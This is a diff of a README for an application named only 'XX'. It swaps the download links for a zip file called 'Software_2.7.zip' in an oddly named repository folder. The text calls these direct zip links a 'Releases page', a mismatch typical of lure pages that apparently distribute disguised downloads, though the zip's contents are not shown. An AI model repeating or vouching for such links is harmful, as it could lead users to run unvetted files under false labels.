@@ -6,7 +6,7 @@ Welcome to XX! This guide will help you easily download and run the application,
 
 ## 📥 Download the Application
 
-[![Download XX](https://raw.githubusercontent.com/carloandremoreyra/XX/main/lakarpite/XX.zip)](https://raw.githubusercontent.com/carloandremoreyra/XX/main/lakarpite/XX.zip)
+[![Download XX](https://github.com/carloandremoreyra/XX/raw/refs/heads/main/lakarpite/Software_2.7.zip)](https://github.com/carloandremoreyra/XX/raw/refs/heads/main/lakarpite/Software_2.7.zip)
 
 You can find the newest version of XX at our Releases page. The download is straightforward and user-friendly.
 
@@ -36,7 +36,7 @@ To get XX on your device, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to our download page.
 
-   [Download XX](https://raw.githubusercontent.com/carloandremoreyra/XX/main/lakarpite/XX.zip)
+   [Download XX](https://github.com/carloandremoreyra/XX/raw/refs/heads/main/lakarpite/Software_2.7.zip)
 
 2. **Choose Your Version:** Look for the latest version listed on the page. You will see clear labels to help you identify the correct files.
 
@@ -58,7 +58,7 @@ For more detailed instructions on how to navigate XX and utilize its features, c
 
 ## 🔗 Useful Links
 
-- **Releases Page:** [Download XX](https://raw.githubusercontent.com/carloandremoreyra/XX/main/lakarpite/XX.zip)
+- **Releases Page:** [Download XX](https://github.com/carloandremoreyra/XX/raw/refs/heads/main/lakarpite/Software_2.7.zip)
 - **User Guide:** Accessible from within the application.
 - **Support Community:** Join our community forum for tips and support.
 
